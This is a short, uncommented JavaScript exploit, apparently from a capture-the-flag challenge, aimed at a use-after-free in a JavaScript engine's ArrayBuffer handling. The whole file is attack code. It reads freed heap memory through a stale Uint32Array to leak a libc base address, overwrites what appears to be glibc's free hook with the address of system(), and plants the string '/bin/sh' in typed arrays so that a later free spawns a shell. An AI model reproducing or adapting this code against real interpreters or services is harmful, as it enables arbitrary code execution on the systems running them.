const hex = (x) => {return ("0x" + x.toString(16))};
let a0, a1;

function f2() {
	const abs = [];
	a0 = 1;
	for (let i = 0; i < 8; i++) abs.push(new ArrayBuffer(8));; 
	
	const tas = [];
	for (let i = 0; i < 8; i++)
	{
	  const ta = new Uint32Array(abs[i]);
	  ta[0] = 0x6e69622f;
	  ta[1] = 0x68732f; 
	  tas.push(ta);
	}

	const libc_addr = a1[0xa0/4]+(a1[0xa0/4+1] * 0x100000000) - 0x3ebca0
	
	a1[0x578/4] = (libc_addr + 0x3ed8e8) & 0xffffffff;
	a1[0x578/4+1] = ((libc_addr + 0x3ed8e8) - a1[0x578/4]) / 0x100000000;
	tas[3][0] = (libc_addr + 0x4f550) & 0xffffffff;
	tas[3][1] = ((libc_addr + 0x4f550) - tas[3][0]) / 0x100000000;
}

function f1(a) {
	arr = 1; 
	a0 = new Uint32Array(a);
	a1 = a0; 

	let p = new Promise((resolve, reject) => {
		resolve(0);
	});
	p.then(f2);
}

let arr = new ArrayBuffer(0xa00);
function main() {
	let p = new Promise((resolve, reject) => {
		resolve(arr);
	});
	p.then(f1);
}

main();
